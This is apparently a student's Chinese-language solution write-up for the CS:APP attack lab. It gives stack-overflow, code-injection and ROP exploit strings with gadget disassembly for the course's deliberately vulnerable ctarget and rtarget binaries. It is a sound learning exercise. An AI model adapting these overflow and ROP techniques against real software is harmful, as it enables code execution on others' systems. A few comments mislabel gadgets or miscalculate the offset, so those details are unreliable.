# attacklab solution

attack lab 就没有 bomb lab 那样简单明快，不读 pdf 的话甚至都不知道应该做什么...

于是做每个 phase 前都要读下pdf，把要求翻译出来

## phase 1~3

phase1-3 都是对 `getbuf` 进行缓冲区溢出攻击。

~~~assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp # 开辟40字节栈空间
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
~~~

~~~c
int getbuf() {
  	// 这里其实也不知道具体指定的是多少，编译器会默认多分配一些栈空间
    // 但是我们知道这里超过 40 就会影响到调用者保存的恢复地址
  	char alloc[40];
    // 调用 Gets，这是溢出的元凶
  	Gets(&alloc);
  	return 1;
}
~~~

### phase1

phase1 我们不需要插入新代码，我们只需要利用字符串溢出将函数的返回地址重定向到一个已经存在的 *procedure*（lecture 里老师提到过，就是其他的函数的最后一段 含ret指令）。

![image-20230424152846785](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20230424152846785.png)

`test` 中调用了  `getbuf ` 函数，`getbuf` 函数执行完毕后会恢复执行回到 `test` 函数。这里我们希望改变这个行为，让他恢复执行的时候跳转到 `touch1` 而非回到 `test` 。请注意，你的漏洞利用字符串也可能会破坏与此阶段不直接相关的堆栈部分。但得益于 `touch1` 使程序直接退出，这并不会导致一个问题。

![image-20230425081242458](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20230425081242458.png)

先拿到 `touch1` 的地址。`0x4017c0`

![image-20230425090256671](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20230425090256671.png)

本来需要将其转为溢出的字符，不过 lab 文件中已经提供了将 hex bytes 转为字符串的工具。

先随便写 40 个字节溢出到函数返回地址处，注意小端排列

> 00 11 45 14 19 19 81 00
>
> 00 11 45 14 19 19 81 00
>
> 00 11 45 14 19 19 81 00
>
> 00 11 45 14 19 19 81 00
>
> 00 11 45 14 19 19 81 00
>
> c0 17 40 00 00 00 00 00

![image-20230425092444653](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20230425092444653.png)

### phase2

![image-20230425121649563](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20230425121649563.png) 

Phase 2 就是要你注入一小段代码。任务是让 ctarget 运行 touch2 的代码而不是返回到 test。在这种情况下，你必须把你的 cookie 传递给 touch2 而不是简单的调用它。

总之先该插入什么代码吧。

~~~assembly
movq $0x59b997fa, %rdi # 将 cookie 作为参数传入
push $0x4017ec # 将要跳转的地址push到栈上，这里是 touch2 函数的地址
ret # ret 会取出栈上的返回地址，并跳转到该位置
~~~

怎么插入？当然是先给他编译成二进制，再把这段二进制插入到刚才没有用到的栈区域，然后我们把 test 栈帧保存的返回地址修改为这个栈区域的开始地址，让 `getbuf` 返回跳转到这段代码，这就是代码注入的实现思路。

当然，那块栈区域实际上编译期是不知道地址的，不过我们拿 gdb 断点一下就知道了。

（mac m1/m2 qemu 模拟环境 gdb debug x86 程序有坑，本想在服务器上 debug 结果服务器不知道为啥一运行就 segmentation fault，于是还是请了我的 x86 linux 轻薄本出山）

![img_v2_ca388e8d-1548-462d-a05d-5a805152e14g](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimg_v2_ca388e8d-1548-462d-a05d-5a805152e14g.jpg)

从这里可以看出刚进入 `getbuf` 时栈指针为 `0x5561dca0`，那么可以推出数组开始的地址为 0x5561dca0 - 0x28 = `0x5561dc78` 

然后我们用 gcc 把上面给出的要插入的汇编代码编译一下拿到对应的二进制。编译出来的二进制已经是小端排列，照抄即可。

![image-20230425211534026](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20230425211534026.png)

> 48 c7 c7 fa 97 b9 59 68
>
> ec 17 40 00 c3 19 81 00
>
> 00 11 45 14 19 19 81 00
>
> 00 11 45 14 19 19 81 00
>
> 00 11 45 14 19 19 81 00
>
> 78 dc 61 55 00 00 00 00

### phase3

![image-20230426172927009](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20230426172927009.png)

phase 3 也是要做代码注入攻击，不过需要传递一个字符串作为参数。任务是让 `ctarget` 运行 `touch3` 的代码，而不是返回到 `test`。你必须要传入 cookie 字符串作为参数再调用它。

之前插入的 cookie 是数字形式，所以只需要立即数直接扔 %rdi 就好了，字符串要稍微麻烦点，不过也就是多分配一块存字符串的内存而已，应该不难。

总之先把 cookie 字符串转为字节(hex)形式吧。

> "59b997fa\0" -> 35 39 62 39 39 37 66 61 00

思路跟 phase2 差不多，先写出我们要注入的汇编代码

~~~assembly
movq $(cookie字符串首地址), %rdi # 将cookie字符串作为参数传入
push $(touch3函数的地址) # 把touch3函数地址压进栈
ret # 返回
~~~

那么当务之急就是确定cookie字符串的首地址，拿到touch3函数的地址

![image-20230429171117778](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20230429171117778.png)

得到 `touch3` 函数的首地址 `0x4018fa`

接下来就是确定 cookie 字符串的地址: 直接塞在注入的字符串里应该是塞得下的，我们把字符串放在注入字符串的最后面。字符串一共占9个字节，起始地址为 0x5561dca0 + 8 (返回地址长度) = 0x5561dca8

于是得到完整汇编代码

~~~assembly
movq $0x5561dca8, %rdi
push $0x4018fa
ret
~~~

拿去汇编一下，得到二进制代码

![image-20230429181105196](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20230429181105196.png)

那么已经可以得出注入字符串了吧

> 48 c7 c7 a8 dc 61 55 68
>
> fa 18 40 00 c3 19 81 00
>
> 00 11 45 14 19 19 81 00
>
> 00 11 45 14 19 19 81 00
>
> 00 11 45 14 19 19 81 00
>
> 78 dc 61 55 00 00 00 00
>
> 35 39 62 39 39 37 66 61
>
> 00

![image-20230429200608211](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20230429200608211.png)

## phase 4~5

Part II - Return-Oriented Programming 即 ROP 攻击（返回挟持攻击）。

我们之所以能在前面三个 phase 中为所欲为还是因为 ctarget 中没有栈随机化和限制代码执行区域等保护措施，但接下来的 rtarget 中则包含着各种安全机制。于是我们另辟蹊径，采用 ROP 攻击。

ROP 攻击的核心在于，在程序可执行部分找到我们想要的字节码片段（即gadget），拼凑出我们想要的代码。

### phase 4

![image-20230430235754522](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20230430235754522.png)

在 rtarget 中使用 gadget 重复 phase2 的操作。只允许使用 `movq` `popq` `ret` `nop` 指令构成的 gadget，并且只允许使用前8个 x86-64 寄存器 (%rax-%rdi)。

所需的 gadget 都可以在 `start_farm` 和 `mid_farm` 两个函数之间 (farm.c定义的函数) 中找到。

编译后得到我们可以用的 `gadgets`

~~~assembly
0000000000000000 <start_farm>:
   0:	f3 0f 1e fa          	endbr64
   4:	b8 01 00 00 00       	mov    $0x1,%eax
   9:	c3                   	ret

000000000000000a <getval_142>:
   a:	f3 0f 1e fa          	endbr64
   e:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  13:	c3                   	ret

0000000000000014 <addval_273>:
  14:	f3 0f 1e fa          	endbr64
  18:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  1e:	c3                   	ret

000000000000001f <addval_219>:
  1f:	f3 0f 1e fa          	endbr64
  23:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  29:	c3                   	ret

000000000000002a <setval_237>:
  2a:	f3 0f 1e fa          	endbr64
  2e:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  34:	c3                   	ret

0000000000000035 <setval_424>:
  35:	f3 0f 1e fa          	endbr64
  39:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  3f:	c3                   	ret

0000000000000040 <setval_470>:
  40:	f3 0f 1e fa          	endbr64
  44:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4a:	c3                   	ret

000000000000004b <setval_426>:
  4b:	f3 0f 1e fa          	endbr64
  4f:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  55:	c3                   	ret

0000000000000056 <getval_280>:
  56:	f3 0f 1e fa          	endbr64
  5a:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  5f:	c3                   	ret

0000000000000060 <mid_farm>:
  60:	f3 0f 1e fa          	endbr64
  64:	b8 01 00 00 00       	mov    $0x1,%eax
  69:	c3                   	ret
~~~

那么我们还是重复之前的操作，把 cookie 放入 %rdi 

~~~assembly
# 所有 gadget 最后一个指令都必须为 ret，方便跳转到下一个 gadget
popq %rax # 从栈内存中取出 cookie 并不一定要是 %rax 寄存器
ret

movq %rax, %rdi # 将 cookie mov 到 %rdi 里面
ret
~~~

需要执行这些操作，我们看看有哪些 gadget 可以使用。当然 gadget 中不直接存在这些指令，但是我们可以找字节序列。先贴出 mov 和 pop 的字节编码表。nop 对应 byte 为 90。

![img](https://pic4.zhimg.com/80/v2-25b4d2d5a66ea71c93d87c5ed336dddb_1440w.webp)

根据表到 farm 里面一个个对 

可以在 `getval_280` 中找到 pop 的 gadget `58 90 c3`。即

~~~assembly
popq %rax
nop
ret
~~~

其起始地址为 `0x4019ca + 2 = 0x4019cc`

可以在 `addval_273` 中找到 mov 的 gadget `48 89 c7 c3`。即

~~~assembly
movq %rax, %rdi
ret
~~~

其起始地址为 `0x4019a0 + 2 = 0x4019a2`

cookie 为 `0x59b997fa`

![image-20230502140052054](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20230502140052054.png)

然后还是老样子，覆盖掉返回地址，不过在那之上还要有其他gadget的返回地址

> 00 00 00 00 00 00 00 00
>
> 00 00 00 00 00 00 00 00
>
> 00 00 00 00 00 00 00 00
>
> 00 00 00 00 00 00 00 00
>
> 00 00 00 00 00 00 00 00
>
> cc 19 40 00 00 00 00 00
>
> fa 97 b9 59 00 00 00 00
>
> a2 19 40 00 00 00 00 00
>
> ec 17 40 00 00 00 00 00

![image-20230502140437620](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20230502140437620.png)

### phase5

> Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now. Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.
>
> Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.

![image-20230502143150856](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20230502143150856.png)

![image-20230502144151172](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20230502144151172.png)

看来即便对于 CMU 的学生来说，phase5 也不是一个基本要求，算是一个进阶作业。

下面是需要用到的指令的字节编码表。

![image-20230502143323266](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20230502143323266.png)

![image-20230502143542768](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20230502143542768.png)

> 要解决第五阶段，您可以使用在rtarget代码区域中start_farm和end_farm函数标记之间的小工具。除了第四阶段使用的小工具外，这个扩展的代码区域还包括不同movl指令的编码，如图3C所示。这个代码区域中的字节序列还包含作为功能性nop的2字节指令，即它们不会改变任何寄存器或内存值。这些指令如图3D所示，如andb %al，%al，它们操作一些寄存器的低位字节，但不改变它们的值。
>
> 一些建议： 
>
> • 您需要查看movl指令对寄存器的高4字节产生的影响，这在教材第183页中有描述。 
>
> • 官方解决方案需要使用8个 gadget（答案不唯一）。

思路基本跟 phase4 和 phase3 一致，不一样的点就在于由于开启了栈随机化，我们这次不能硬编码字符串的地址了，必须想办法在运行时获取。

总之先写出整体的汇编代码吧

~~~assembly
mov %rsp, %rdi # 既可以是movq也可以是movl，因为只用到了前4位，%rax也可以是其他寄存器
ret
popq %rsi # 拿出我们事先设定好的偏移量
ret
call <add_xy> # gadget中有一个特殊的函数，将x，y加起来，可以直接用。当然实际用的时候肯定是ret到他的地址，而不是call
ret
mov %rax, %rdi # 把返回值mov到rdi
ret
~~~

一共需要四个 gadget。

那么又到了愉快的找 gadget 时间。

~~~assembly
0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	ret

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	ret

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	ret

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	ret

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	ret

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	ret

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	ret

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	ret

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	ret

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
  4019d5:	c3                   	ret

00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	ret

00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	ret

00000000004019e1 <setval_296>:
  4019e1:	c7 07 99 d1 90 90    	movl   $0x9090d199,(%rdi)
  4019e7:	c3                   	ret

00000000004019e8 <addval_113>:
  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax
  4019ee:	c3                   	ret

00000000004019ef <addval_490>:
  4019ef:	8d 87 8d d1 20 db    	lea    -0x24df2e73(%rdi),%eax
  4019f5:	c3                   	ret

00000000004019f6 <getval_226>:
  4019f6:	b8 89 d1 48 c0       	mov    $0xc048d189,%eax
  4019fb:	c3                   	ret

00000000004019fc <setval_384>:
  4019fc:	c7 07 81 d1 84 c0    	movl   $0xc084d181,(%rdi)
  401a02:	c3                   	ret

0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	ret

0000000000401a0a <setval_276>:
  401a0a:	c7 07 88 c2 08 c9    	movl   $0xc908c288,(%rdi)
  401a10:	c3                   	ret

0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	ret

0000000000401a18 <getval_345>:
  401a18:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax
  401a1d:	c3                   	ret

0000000000401a1e <addval_479>:
  401a1e:	8d 87 89 c2 00 c9    	lea    -0x36ff3d77(%rdi),%eax
  401a24:	c3                   	ret

0000000000401a25 <addval_187>:
  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
  401a2b:	c3                   	ret

0000000000401a2c <setval_248>:
  401a2c:	c7 07 81 ce 08 db    	movl   $0xdb08ce81,(%rdi)
  401a32:	c3                   	ret

0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	ret

0000000000401a39 <addval_110>:
  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax
  401a3f:	c3                   	ret

0000000000401a40 <addval_487>:
  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
  401a46:	c3                   	ret

0000000000401a47 <addval_201>:
  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
  401a4d:	c3                   	ret

0000000000401a4e <getval_272>:
  401a4e:	b8 99 d1 08 d2       	mov    $0xd208d199,%eax
  401a53:	c3                   	ret

0000000000401a54 <getval_155>:
  401a54:	b8 89 c2 c4 c9       	mov    $0xc9c4c289,%eax
  401a59:	c3                   	ret

0000000000401a5a <setval_299>:
  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
  401a60:	c3                   	ret

0000000000401a61 <addval_404>:
  401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax
  401a67:	c3                   	ret

0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	ret

0000000000401a6e <setval_167>:
  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
  401a74:	c3                   	ret

0000000000401a75 <setval_328>:
  401a75:	c7 07 81 c2 38 d2    	movl   $0xd238c281,(%rdi)
  401a7b:	c3                   	ret

0000000000401a7c <setval_450>:
  401a7c:	c7 07 09 ce 08 c9    	movl   $0xc908ce09,(%rdi)
  401a82:	c3                   	ret

0000000000401a83 <addval_358>:
  401a83:	8d 87 08 89 e0 90    	lea    -0x6f1f76f8(%rdi),%eax
  401a89:	c3                   	ret

0000000000401a8a <addval_124>:
  401a8a:	8d 87 89 c2 c7 3c    	lea    0x3cc7c289(%rdi),%eax
  401a90:	c3                   	ret

0000000000401a91 <getval_169>:
  401a91:	b8 88 ce 20 c0       	mov    $0xc020ce88,%eax
  401a96:	c3                   	ret

0000000000401a97 <setval_181>:
  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)
  401a9d:	c3                   	ret

0000000000401a9e <addval_184>:
  401a9e:	8d 87 89 c2 60 d2    	lea    -0x2d9f3d77(%rdi),%eax
  401aa4:	c3                   	ret

0000000000401aa5 <getval_472>:
  401aa5:	b8 8d ce 20 d2       	mov    $0xd220ce8d,%eax
  401aaa:	c3                   	ret

0000000000401aab <setval_350>:
  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  401ab1:	c3                   	ret

0000000000401ab2 <end_farm>:
  401ab2:	b8 01 00 00 00       	mov    $0x1,%eax
  401ab7:	c3                   	ret
  401ab8:	90                   	nop
  401ab9:	90                   	nop
  401aba:	90                   	nop
  401abb:	90                   	nop
  401abc:	90                   	nop
  401abd:	90                   	nop
  401abe:	90                   	nop
  401abf:	90                   	nop
~~~

发现 movq 语句能找到的 gadget 只有 `48 89 e0/c7`。也就是 `mov %rax, %rdi` 和 `mov %rsp, %rax`。

所以第一个 gadget 可以拆分成两个

~~~assembly
movq %rsp, %rax # 48 89 e0 c3 0x401a06 addval_273
ret

movq %rax, %rdi # 48 89 c7 c3 0x4019a2 addval_190
ret
~~~

然后我们继续找 popq 语句的 gadget。

~~~assembly
popq %rax # 58 90 c3 0x4019ab addval_219
nop
ret
~~~

然后我们需要把 %rax 里的东西 mov 到 %rsi。

~~~assembly
movl %eax, %edx # 0x4019dd
movl %edx, %ecx # 0x401a34
movl %ecx, %esi # 0x401a13
~~~

然后我们需要把 %rax 移到 %rsi

~~~assembly
movq %rax, %rdi # 48 89 e0 c3 0x4019a2 addval_190
ret
~~~

这样 gadget 就找齐了，真是意料之外的轻松。

> 00 00 00 00 00 00 00 00
>
> 00 00 00 00 00 00 00 00
>
> 00 00 00 00 00 00 00 00
>
> 00 00 00 00 00 00 00 00
>
> 00 00 00 00 00 00 00 00
>
> 06 1a 40 00 00 00 00 00 # movq %rsp, %rax
>
> a2 19 40 00 00 00 00 00 # movq %rax, %rdi
>
> ab 19 40 00 00 00 00 00 # popq %rax
>
> 48 00 00 00 00 00 00 00 # 指令偏移量 8x9=78=0x48
>
> dd 19 40 00 00 00 00 00 # movl %eax, %edx
>
> 34 1a 40 00 00 00 00 00 # movl %edx, %ecx
>
> 13 1a 40 00 00 00 00 00 # movl %ecx, %esi
>
> d6 19 40 00 00 00 00 00 # leaq (%rdi,%rsi), %rax
>
> a2 19 40 00 00 00 00 00 # movq %rax, %rdi
>
> fa 18 40 00 00 00 00 00 # touch3地址
>
> 35 39 62 39 39 37 66 61 # cookie字符串
>
> 00 00 00 00 00 00 00 00

![image-20230503145624079](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20230503145624079.png)
